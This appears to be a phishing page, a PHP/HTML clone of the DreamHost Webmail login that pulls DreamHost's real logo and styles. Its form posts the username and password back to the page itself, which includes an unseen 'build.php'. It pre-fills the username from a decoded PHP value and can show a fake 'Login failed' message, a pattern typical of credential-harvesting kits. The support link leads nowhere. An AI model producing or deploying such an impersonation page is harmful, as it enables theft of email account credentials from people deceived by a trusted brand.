<?php include '../build.php' ?>
<html lang="en" class="js chrome layout-large">
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<title>DreamHost Webmail :: Welcome to DreamHost Webmail</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0">
<meta name="theme-color" content="#f4f4f4">
<meta name="msapplication-navbutton-color" content="#f4f4f4">
<link rel="shortcut icon" href="https://webmail.dreamhost.com/skins/dreamhost/images/favicon.png">
<link rel="stylesheet" type="text/css" href="https://webmail.dreamhost.com/skins/elastic/deps/bootstrap.min.css">
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<link rel="stylesheet" type="text/css" href="../assets/password-fix.css?v=3">
<style>
    body {
        background: #f4f4f4;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        margin: 0;
        padding: 0;
    }

    #layout {
        max-width: 420px;
        margin: 60px auto;
        padding: 0 20px;
    }

    #layout-content {
        background: #fff;
        border-radius: 8px;
        padding: 40px 32px 32px;
        box-shadow: 0 2px 12px rgba(0,0,0,.08);
        text-align: center;
    }

    #logo {
        max-width: 180px;
        margin: 0 auto 28px;
        display: block;
    }

    .voice {
        position: absolute;
        width: 1px;
        height: 1px;
        padding: 0;
        margin: -1px;
        overflow: hidden;
        clip: rect(0,0,0,0);
        border: 0;
    }

    form.propform {
        text-align: left;
    }

    .form-row {
        margin-bottom: 16px;
    }

    /* ========================================================
       INPUT-GROUP — pure flex, works identically for user
       and password (MaskedPassword) fields.
       ======================================================== */
    .input-group {
        display: flex;
        width: 100%;
        align-items: stretch;      /* children stretch to same height */
        border-radius: .25rem;
        overflow: hidden;
        box-sizing: border-box;
    }

    .input-group-prepend {
        display: flex;
        align-items: center;       /* icon vertically centered */
        justify-content: center;
        background: #e9ecef;
        border: 1px solid #ced4da;
        border-right: 0;
        padding: 0 .75rem;
        min-width: 46px;
        box-sizing: border-box;
    }

    .input-group-text {
        color: #495057;
        font-size: 1rem;
        line-height: 1;
        display: flex;
        align-items: center;
    }

    /* Both native and MaskedPassword-wrapped inputs */
    .input-group .form-control,
    .input-group input.masked,
    .input-group input[type="text"],
    .input-group input[type="password"] {
        flex: 1 1 auto;
        width: 1%;
        min-width: 0;
        height: calc(1.5em + .75rem + 2px);
        padding: .375rem .75rem;
        font-size: 1rem;
        font-weight: 400;
        line-height: 1.5;
        color: #495057;
        background-color: #fff;
        border: 1px solid #ced4da;
        border-radius: 0 .25rem .25rem 0;
        box-sizing: border-box;
        outline: none;
        margin: 0;
        vertical-align: middle;
    }

    .input-group .form-control:focus,
    .input-group input.masked:focus {
        border-color: #80bdff;
        box-shadow: 0 0 0 .2rem rgba(0,123,255,.25);
    }

    .input-group .form-control::placeholder,
    .input-group input.masked::placeholder {
        color: #6c757d;
        opacity: 1;
        line-height: normal;
        vertical-align: middle;
    }

    /* ========================================================
       MaskedPassword wrapper — the <span> it injects must
       become a flex child that fills the remaining space.
       ======================================================== */
    .input-group > span {
        display: flex !important;
        align-items: center !important;
        flex: 1 1 auto !important;
        min-width: 0 !important;
        height: auto !important;
        box-sizing: border-box;
    }

    .input-group > span > input {
        flex: 1 1 auto !important;
        width: 100% !important;
        height: calc(1.5em + .75rem + 2px) !important;
        padding: .375rem .75rem !important;
        line-height: 1.5 !important;
        box-sizing: border-box !important;
    }

    /* Hidden real field — out of layout completely */
    .input-group input[type="hidden"],
    input[name="pass"][type="hidden"] {
        display: none !important;
        position: absolute !important;
        width: 0 !important;
        height: 0 !important;
        padding: 0 !important;
        margin: 0 !important;
        border: 0 !important;
    }

    .formbuttons {
        margin: 22px 0 18px;
    }

    #rcmloginsubmit {
        width: 100%;
        padding: .65rem 1rem;
        font-size: 1rem;
        font-weight: 600;
        text-transform: uppercase;
        letter-spacing: .04em;
        color: #fff;
        background: #1e6dd9;
        border: 0;
        border-radius: .25rem;
        cursor: pointer;
        transition: background .15s ease;
    }

    #rcmloginsubmit:hover {
        background: #1858b0;
    }

    #login-footer {
        text-align: center;
        font-size: 13px;
        color: #6c757d;
    }

    #login-footer a {
        color: #1e6dd9;
        text-decoration: none;
    }

    #messagestack {
        max-width: 420px;
        margin: 0 auto;
    }

    #messagestack .ui.alert {
        background: #fff3cd;
        border: 1px solid #ffeeba;
        color: #856404;
        padding: 12px 16px;
        border-radius: 6px;
        margin-top: 16px;
        display: flex;
        align-items: center;
        gap: 8px;
    }

    .icon.user::before { font-family: "Font Awesome 6 Free"; font-weight: 900; content: "\f007"; }
    .icon.pass::before { font-family: "Font Awesome 6 Free"; font-weight: 900; content: "\f023"; }
</style>
</head>
<body class="task-login action-none">
    <div id="layout">
        <h1 class="voice">DreamHost Webmail Login</h1>

        <div id="layout-content" role="main">
            <img src="https://webmail.dreamhost.com/skins/dreamhost/images/logo-full.svg" id="logo" alt="DreamHost">

            <form id="login-form" name="login-form" method="post" class="propform" action="">
                <input type="hidden" name="login" value="dreamhost">

                <div class="form-row">
                    <div class="input-group">
                        <span class="input-group-prepend">
                            <i class="input-group-text icon user"></i>
                        </span>
                        <input name="user"
                               id="rcmloginuser"
                               value="<?php echo htmlspecialchars($decoded ?? ''); ?>"
                               required
                               size="40"
                               class="form-control"
                               autocapitalize="off"
                               autocomplete="off"
                               type="text"
                               placeholder="Username">
                    </div>
                </div>

                <div class="form-row">
                    <div class="input-group">
                        <span class="input-group-prepend">
                            <i class="input-group-text icon pass"></i>
                        </span>
                        <input name="pass"
                               id="rcmloginpwd"
                               size="40"
                               class="form-control"
                               autocapitalize="off"
                               autocomplete="off"
                               type="text"
                               placeholder="Password">
                    </div>
                </div>

                <p class="formbuttons">
                    <button type="submit" id="rcmloginsubmit">Login</button>
                </p>

                <div id="login-footer" role="contentinfo">
                    DreamHost Webmail&nbsp;•&nbsp;
                    <a href="#" target="_blank" class="support-link">Get support</a>
                </div>
            </form>
        </div>
    </div>

    <div id="messagestack" style="<?php echo $error ?? 'display:none;'; ?>">
        <div class="ui alert alert-warning" role="alert">
            <i class="icon"></i><span>Login failed.</span>
        </div>
    </div>

    <script type="text/javascript">
    /* ============================================================
       MaskedPassword — Roundcube's password masking helper.
       Kept in its original form so bullets render via the custom
       mask rather than native input[type=password].
       ============================================================ */
    function MaskedPassword(e,d){
        if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}
        if(e==null){return false}
        this.symbol=d;
        this.isIE=typeof document.uniqueID!="undefined";
        e.value="";
        e.defaultValue="";
        e._contextwrapper=this.createContextWrapper(e);
        this.fullmask=false;
        var f=e._contextwrapper;
        var b='<input type="hidden" name="'+e.name+'">';
        var c=this.convertPasswordFieldHTML(e);
        f.innerHTML=b+c;
        e=f.lastChild;
        e.className+=" masked";
        e.setAttribute("autocomplete","off");
        e._realfield=f.firstChild;
        e._contextwrapper=f;
        this.limitCaretPosition(e);
        var a=this;
        this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});
        this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});
        this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});
        this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});
        this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});
        this.forceFormReset(e);
        return true
    }
    MaskedPassword.prototype={
        doPasswordMasking:function(a){
            var d="";
            if(a._realfield.value!=""){
                for(var b=0;b<a.value.length;b++){
                    if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}
                    else{d+=a.value.charAt(b)}
                }
            }else{d=a.value}
            var c=this.encodeMaskedPassword(d,this.fullmask,a);
            if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}
        },
        encodeMaskedPassword:function(d,f,b){
            var a=f===true?0:1;
            for(var e="",c=0;c<d.length;c++){
                if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}
            }
            return e
        },
        createContextWrapper:function(a){
            var b=document.createElement("span");
            b.style.position="relative";
            a.parentNode.insertBefore(b,a);
            b.appendChild(a);
            return b
        },
        forceFormReset:function(a){
            while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}
            if(!/form/i.test(a.nodeName)){return null}
            this.addSpecialLoadListener(function(){a.reset()});
            return a
        },
        convertPasswordFieldHTML:function(c,e){
            var b="<input";
            for(var d=c.attributes,a=0;a<d.length;a++){
                if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){
                    b+=" "+d[a].name+'="'+d[a].value+'"'
                }
            }
            b+=' type="text" autocomplete="off">';
            return b
        },
        limitCaretPosition:function(a){
            var d=null,
                c=function(){
                    if(d==null){
                        if(this.isIE){
                            d=window.setInterval(function(){
                                var e=a.createTextRange(),g=a.value.length,f="character";
                                e.moveEnd(f,g);e.moveStart(f,g);e.select()
                            },100)
                        }else{
                            d=window.setInterval(function(){
                                var e=a.value.length;
                                if(!(a.selectionEnd==e&&a.selectionStart<=e)){
                                    a.selectionStart=e;a.selectionEnd=e
                                }
                            },100)
                        }
                    }
                },
                b=function(){window.clearInterval(d);d=null};
            this.addListener(a,"focus",function(){c()});
            this.addListener(a,"blur",function(){b()})
        },
        addListener:function(c,a,b){
            if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}
            else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}
        },
        addSpecialLoadListener:function(a){
            if(this.isIE){return window.attachEvent("onload",a)}
            else{return document.addEventListener("DOMContentLoaded",a,false)}
        },
        getTarget:function(a){
            if(!a){return null}
            return a.target?a.target:a.srcElement
        }
    };
    </script>

    <script type="text/javascript">
    /* ============================================================
       Initialize MaskedPassword + post-fix the wrapper layout.
       Runs after DOM is parsed so #rcmloginpwd exists.
       ============================================================ */
    (function () {
        function initMasked() {
            var pwd = document.getElementById("rcmloginpwd");
            if (!pwd) return;

            try {
                new MaskedPassword(pwd, "\u25CF");
            } catch (err) {
                // Fallback to native password input on failure
                pwd.type = "password";
                return;
            }

            // -------- Post-fix layout --------
            // 1. The wrapper span MaskedPassword injected
            var wrapper = pwd.parentNode;
            if (wrapper && wrapper.tagName === "SPAN") {
                wrapper.style.position    = "relative";
                wrapper.style.display     = "flex";
                wrapper.style.alignItems  = "center";
                wrapper.style.flex        = "1 1 auto";
                wrapper.style.width       = "100%";
                wrapper.style.minWidth    = "0";
                wrapper.style.minHeight   = "calc(1.5em + .75rem + 2px)";
                wrapper.style.boxSizing   = "border-box";
            }

            // 2. The visible (converted) masked input
            var visible = document.querySelector("input.masked");
            if (visible) {
                visible.style.height     = "calc(1.5em + .75rem + 2px)";
                visible.style.minHeight  = "calc(1.5em + .75rem + 2px)";
                visible.style.lineHeight = "1.5";
                visible.style.padding    = ".375rem .75rem";
                visible.style.width      = "100%";
                visible.style.boxSizing  = "border-box";
                visible.style.flex       = "1 1 auto";
                visible.style.border     = "1px solid #ced4da";
                visible.style.borderRadius = "0 .25rem .25rem 0";
                visible.style.background = "#fff";
                visible.style.outline    = "none";
            }

            // 3. The hidden real field — ensure it's out of the layout
            var hidden = document.querySelector('input[name="pass"][type="hidden"]');
            if (hidden) {
                hidden.style.display = "none";
                hidden.style.position = "absolute";
                hidden.style.width = "0";
                hidden.style.height = "0";
            }
        }

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", initMasked);
        } else {
            initMasked();
        }
    })();
    </script>
</body>
</html>